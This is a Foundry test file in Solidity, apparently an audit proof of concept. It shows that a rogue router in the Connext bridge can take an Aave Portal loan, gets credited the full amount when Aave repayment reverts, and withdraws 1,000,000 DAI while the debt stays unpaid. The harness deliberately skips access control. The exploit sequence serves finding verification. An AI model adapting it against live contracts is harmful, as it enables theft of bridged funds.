// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "forge-std/Test.sol";

import {BridgeFacet} from "../src/connext/core/connext/facets/BridgeFacet.sol";
import {RoutersFacet} from "../src/connext/core/connext/facets/RoutersFacet.sol";
import {PortalFacet} from "../src/connext/core/connext/facets/PortalFacet.sol";
import {TokenRegistry} from "../src/connext/core/connext/helpers/TokenRegistry.sol";
import {ConnextMessage} from "../src/connext/core/connext/libraries/ConnextMessage.sol";
import {CallParams, ExecuteArgs} from "../src/connext/core/connext/libraries/LibConnextStorage.sol";
import {ITokenRegistry} from "../src/connext/core/connext/interfaces/ITokenRegistry.sol";
import {IAavePool} from "../src/connext/core/connext/interfaces/IAavePool.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

/// @dev Plain adopted/local ERC20 that the protocol treats as an opaque token.
contract MockDai is ERC20 {
  constructor() ERC20("Dai Stablecoin", "DAI") {}

  function mint(address to, uint256 amount) external {
    _mint(to, amount);
  }
}

/// @dev Minimal REAL Aave Portal boundary. Only the *external* Aave pool interface
///      (`IAavePool`) is stood in for here; every line of Connext repayment logic
///      (`_reconcileProcessPortal`, the router credit in `_reconcile`) is the audited
///      source, untouched. `mintUnbacked` records the unbacked (unrepaid) position,
///      `withdraw` lends the underlying to the bridge, and `backUnbacked` is the
///      repayment call that the finding says can fail — here it reverts, exercising
///      the documented failure branch (BridgeFacet.sol#L1035-L1048).
contract MockAavePortal is IAavePool {
  mapping(address => uint256) public unbacked; // asset => unbacked (unrepaid) amount
  bool public repayEnabled;

  function setRepayEnabled(bool _v) external {
    repayEnabled = _v;
  }

  function mintUnbacked(
    address asset,
    uint256 amount,
    address,
    uint16
  ) external override {
    unbacked[asset] += amount;
  }

  function withdraw(
    address asset,
    uint256 amount,
    address to
  ) external override returns (uint256) {
    IERC20(asset).transfer(to, amount);
    return amount;
  }

  function backUnbacked(
    address asset,
    uint256 amount,
    uint256 fee
  ) external override {
    // Simulates the external repayment call failing (finding PoC step 6).
    require(repayEnabled, "AAVE_PORTAL: backUnbacked reverted");
    IERC20(asset).transferFrom(msg.sender, address(this), amount + fee);
    unbacked[asset] -= amount;
  }
}

/// @dev Combines the audited BridgeFacet + RoutersFacet + PortalFacet over the single
///      shared diamond `AppStorage` (slot 0), exactly as they run behind the Connext
///      diamond proxy. The only additions are an access-control-free storage seeder
///      (analogous to the production DiamondInit/admin setters) and a thin wrapper that
///      forwards to the audited internal `_reconcile` (the nomad replica / remote-router
///      auth wrapper `handle` is bypassed the same way the diamond's onlyReplica gate is
///      not the bug). No exploit-path logic is modified.
contract ConnextPortalHarness is BridgeFacet, RoutersFacet, PortalFacet {
  function seed(
    address tokenRegistry_,
    address aavePool_,
    address router_,
    address routerOwner_,
    address local_,
    bytes32 canonicalId_
  ) external {
    s.tokenRegistry = ITokenRegistry(tokenRegistry_);
    s.aavePool = aavePool_;
    s.LIQUIDITY_FEE_NUMERATOR = 10000; // no fast-liquidity fee -> toSwap == amount
    s.LIQUIDITY_FEE_DENOMINATOR = 10000;
    s.aavePortalFeeNumerator = 0; // no portal fee -> keep the numbers exact
    s.maxRoutersPerTransfer = 5;
    s.routerPermissionInfo.approvedRouters[router_] = true;
    s.routerPermissionInfo.approvedForPortalRouters[router_] = true;
    s.routerPermissionInfo.routerOwners[router_] = routerOwner_;
    // adopted == local so no AMM swap is needed on either the loan or repay path
    s.canonicalToAdopted[canonicalId_] = local_;
  }

  /// @notice Delivers a reconcile message the way a nomad relayer would (auth wrapper
  ///         `handle`/onlyReplica omitted; `_reconcile` runs verbatim).
  function reconcileExposed(uint32 _origin, bytes memory _message) external {
    _reconcile(_origin, _message);
  }

  /// @notice Builds a real nomad Transfer message using the audited ConnextMessage lib.
  function buildTransferMessage(
    uint32 tokenDomain,
    bytes32 tokenId,
    bytes32 to,
    uint256 amount,
    bytes32 detailsHash,
    bytes32 transferId
  ) external view returns (bytes memory) {
    return
      ConnextMessage.formatMessage(
        ConnextMessage.formatTokenId(tokenDomain, tokenId),
        ConnextMessage.formatTransfer(to, amount, detailsHash, transferId)
      );
  }
}

contract PoC_25134 is Test {
  ConnextPortalHarness internal connext;
  TokenRegistry internal registry;
  MockAavePortal internal aave;
  MockDai internal dai;

  uint32 internal constant LOCAL_DOMAIN = 1735353714; // canonical (destination) domain
  uint32 internal constant ORIGIN_DOMAIN = 6648936;
  uint256 internal constant AMOUNT = 1_000_000 ether; // 1,000,000 DAI bridged

  uint256 internal constant ROUTER_PK = uint256(keccak256("router.signing.key"));
  address internal router;
  address internal constant ROUTER_OWNER = address(0xB0B); // rogue router operator
  address internal constant USER = address(0xA71CE); // bridge recipient (fast transfer)
  address internal constant RELAYER = address(0xE0A); // execute() caller (== params.agent)
  address internal constant WITHDRAW_TO = address(0xF00D); // where the router pulls funds

  bytes32 internal canonicalId;
  bytes32 internal transferId;

  function setUp() public {
    router = vm.addr(ROUTER_PK);

    connext = new ConnextPortalHarness();
    registry = new TokenRegistry();
    registry.setLocalDomain(LOCAL_DOMAIN);
    aave = new MockAavePortal();
    dai = new MockDai();

    canonicalId = bytes32(uint256(uint160(address(dai))));
    connext.seed(address(registry), address(aave), router, ROUTER_OWNER, address(dai), canonicalId);

    // Aave's lending reserve (the credit line drawn on the unbacked mint).
    dai.mint(address(aave), AMOUNT);
    // Canonical-domain custody: DAI escrowed in the diamond from prior xcalls. This is
    // the balance _reconcileProcessPortal is supposed to use to repay Aave.
    dai.mint(address(connext), AMOUNT);

    // The Aave repayment call fails at reconcile time (finding PoC step 6).
    aave.setRepayEnabled(false);
  }

  function _executeArgs() internal view returns (ExecuteArgs memory args, bytes32 tid) {
    CallParams memory params = CallParams({
      to: USER,
      callData: "",
      originDomain: ORIGIN_DOMAIN,
      destinationDomain: LOCAL_DOMAIN,
      agent: RELAYER,
      recovery: USER,
      callback: address(0),
      callbackFee: 0,
      relayerFee: 0,
      forceSlow: false,
      receiveLocal: false,
      slippageTol: 10000
    });

    // transferId as computed by BridgeFacet._getTransferId(ExecuteArgs):
    // getTokenId(local) => (LOCAL_DOMAIN, addressToBytes32(local)) for a local-origin token.
    tid = keccak256(abi.encode(uint256(0), params, address(0x5EED), canonicalId, LOCAL_DOMAIN, AMOUNT));

    // Router signs keccak256(abi.encode(transferId, pathLength)) as an eth-signed message.
    bytes32 routerHash = keccak256(abi.encode(tid, uint256(1)));
    bytes32 digest = ECDSA.toEthSignedMessageHash(routerHash);
    (uint8 v, bytes32 r, bytes32 sSig) = vm.sign(ROUTER_PK, digest);

    address[] memory routers = new address[](1);
    routers[0] = router;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = abi.encodePacked(r, sSig, v);

    args = ExecuteArgs({
      params: params,
      local: address(dai),
      routers: routers,
      routerSignatures: sigs,
      amount: AMOUNT,
      nonce: 0,
      originSender: address(0x5EED)
    });
  }

  function test_router_takes_aave_portal_loan_and_never_repays() public {
    (ExecuteArgs memory args, bytes32 tid) = _executeArgs();
    transferId = tid;

    // ---- Step 1: execute() draws the Aave Portal loan for the fast transfer ----
    // Router has zero liquidity, so BridgeFacet routes through the Aave Portal:
    // mintUnbacked (records unbacked debt) + withdraw (lends AMOUNT) -> pay the user.
    vm.prank(RELAYER);
    bytes32 returned = connext.execute(args);
    assertEq(returned, transferId, "transferId mismatch");

    assertEq(dai.balanceOf(USER), AMOUNT, "user did not receive fast-transfer funds");
    assertEq(connext.getAavePortalDebt(transferId), AMOUNT, "portal debt not recorded");
    assertEq(aave.unbacked(address(dai)), AMOUNT, "aave unbacked not recorded");
    assertEq(dai.balanceOf(address(aave)), 0, "aave should have lent its reserve");
    assertEq(connext.routerBalances(router, address(dai)), 0, "router not yet credited");
    // Diamond still holds the escrow (AMOUNT in, AMOUNT out to user).
    assertEq(dai.balanceOf(address(connext)), AMOUNT, "escrow should remain in diamond");

    // ---- Step 2: reconcile() -- repay to Aave fails, router is credited the full amount ----
    bytes memory message = connext.buildTransferMessage(
      LOCAL_DOMAIN,
      canonicalId,
      bytes32(uint256(uint160(USER))),
      AMOUNT,
      bytes32(0),
      transferId
    );
    connext.reconcileExposed(ORIGIN_DOMAIN, message);

    // The repayment reverted, so instead of being escrowed for Aave, the whole amount
    // is credited to the router balance and the portal debt is left outstanding.
    assertEq(connext.routerBalances(router, address(dai)), AMOUNT, "router not credited full amount");
    assertEq(connext.getAavePortalDebt(transferId), AMOUNT, "portal debt should remain unpaid");

    // ---- Step 3: rogue router withdraws all its (unearned) liquidity ----
    vm.prank(ROUTER_OWNER);
    connext.removeRouterLiquidityFor(AMOUNT, address(dai), payable(WITHDRAW_TO), router);

    // ---- Concrete harm ----
    // The router walked away with 1,000,000 DAI...
    assertEq(dai.balanceOf(WITHDRAW_TO), AMOUNT, "router did not extract the loan");
    // ...while Connext still owes Aave the full 1,000,000 DAI unbacked loan...
    assertEq(connext.getAavePortalDebt(transferId), AMOUNT, "debt vanished unexpectedly");
    assertEq(aave.unbacked(address(dai)), AMOUNT, "aave still unbacked");
    // ...and neither the Aave reserve nor the diamond escrow is left to cover it.
    assertEq(dai.balanceOf(address(aave)), 0, "aave reserve not drained");
    assertEq(dai.balanceOf(address(connext)), 0, "diamond escrow drained by router");
    assertEq(connext.routerBalances(router, address(dai)), 0, "router balance not spent");
    // The bridge user still (legitimately) holds their transfer.
    assertEq(dai.balanceOf(USER), AMOUNT, "user balance changed");

    emit log_named_decimal_uint("Router stole (DAI)          ", dai.balanceOf(WITHDRAW_TO), 18);
    emit log_named_decimal_uint("Connext debt to Aave (DAI)  ", connext.getAavePortalDebt(transferId), 18);
  }
}
